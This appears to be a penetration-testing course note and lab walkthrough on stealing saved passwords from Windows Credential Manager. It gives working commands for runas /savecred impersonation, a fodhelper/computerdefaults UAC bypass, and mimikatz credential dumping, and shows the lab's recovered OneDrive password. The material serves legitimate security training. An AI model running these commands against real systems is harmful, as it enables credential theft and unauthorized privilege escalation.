### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Attacking Windows Credential Manager <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking Windows Credential Manager



Credential Manager (Server 2008 R2 / Win 7+) — per-user encrypted vault for app/web/domain creds. AES keys protected by DPAPI; modern Windows uses Credential Guard (VBS enclaves).

Vault locations:

- `%UserProfile%\AppData\Local\Microsoft\Vault\`
- `%UserProfile%\AppData\Local\Microsoft\Credentials\`
- `%UserProfile%\AppData\Roaming\Microsoft\Vault\`
- `%ProgramData%\Microsoft\Vault\`
- `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

| Type | Stores |
|---|---|
| Web Credentials | IE / legacy Edge passwords |
| Windows Credentials | OneDrive, domain users, network shares, services |

Export vaults to encrypted `.crd` (UI/CLI):

```diff
+ C:\> rundll32 keymgr.dll,KRShowKeyMgr
```

<br>

Enumerate stored creds:

```diff
+ C:\> cmdkey /list
```

<br>

Common output keys: `Target`, `Type` (Generic / Domain Password), `User`, `Persistence` (Local machine = survives reboots).

Impersonate a stored interactive domain credential:

```diff
+ C:\> runas /savecred /user:SRV01\mcharles cmd
```

<br>

Decrypt creds with mimikatz (target LSASS via sekurlsa):

```diff
+ mimikatz # privilege::debug
+ mimikatz # sekurlsa::credman
```

<br>

If sekurlsa fails (memory access errors), drop to vault module:

```diff
+ mimikatz # vault::cred
```

<br>

Other useful tools: [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [LaZagne](https://github.com/AlessandroZ/LaZagne), [DonPAPI](https://github.com/login-securite/DonPAPI).

<br>

---

<br>

### Exercise

IP: 10.129.16.166

---

### Question 1:
What password does mcharles use for OneDrive?

RDP in as sadams:

```diff
+ $ xfreerdp /v:10.129.16.166 /u:sadams /p:totally2brow2harmon@
```

<br>

List stored creds:

```diff
+ C:\Users\sadams>cmdkey /list
```

	Target: Domain:interactive=SRV01\mcharles
	Type: Domain Password
	User: SRV01\mcharles

<br>

Impersonate mcharles:

```diff
+ C:\Users\sadams>runas /user:SRV01\mcharles /savecred cmd
+ C:\Windows\system32>cmdkey /list
```

	Target: LegacyGeneric:target=onedrive.live.com
	Type: Generic
	User: mcharles@inlanefreight.local

<br>

#### Need admin to fully decrypt with mimikatz. Bypass UAC via fodhelper / computerdefaults reg trick:

```diff
+ C:\> reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+ C:\> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

<br>

Get mimikatz binary onto attack box:

```diff
+ $ git clone https://github.com/gentilkiwi/mimikatz
```

<br>

RDP back in with a shared drive carrying the mimikatz x64 folder:

```diff
+ $ xfreerdp /v:10.129.16.166 /u:sadams /p:totally2brow2harmon@ /drive:share,/home/htb-ac-830862/mimikatz
```

<br>

In the elevated shell, copy mimikatz into Admin home and run:

```diff
+ C:\Users\Administrator>copy C:\Users\sadams\bin C:\Users\Administrator
+ C:\Users\Administrator>mimikatz.exe
+ mimikatz # sekurlsa::credman
```

`sekurlsa::credman` errored on this build, fell back to `vault::cred`:

```diff
+ mimikatz # vault::cred
```

	TargetName : LegacyGeneric:target=onedrive.live.com
	UserName   : mcharles@inlanefreight.local
	Credential : Inlanefreight#2025

&#x1F6A9; found **Inlanefre--edit--ight#2025**.
